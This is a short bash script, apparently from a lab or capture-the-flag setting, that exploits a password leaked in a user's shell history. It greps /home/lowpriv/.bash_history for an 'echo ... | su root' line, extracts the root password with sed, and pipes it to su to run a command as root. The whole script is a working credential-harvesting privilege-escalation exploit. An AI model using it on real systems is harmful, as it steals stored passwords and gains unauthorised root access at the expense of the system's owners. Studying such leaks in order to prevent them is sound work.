#!/usr/bin/env bash
set -e

# Exploit shell history password leak: extract and su to root
pass=$(grep "su root" /home/lowpriv/.bash_history | head -n1 | sed -n "s/^echo '\\(.*\\)' | su root.*$/\\1/p")
echo "$pass" | su root -c whoami
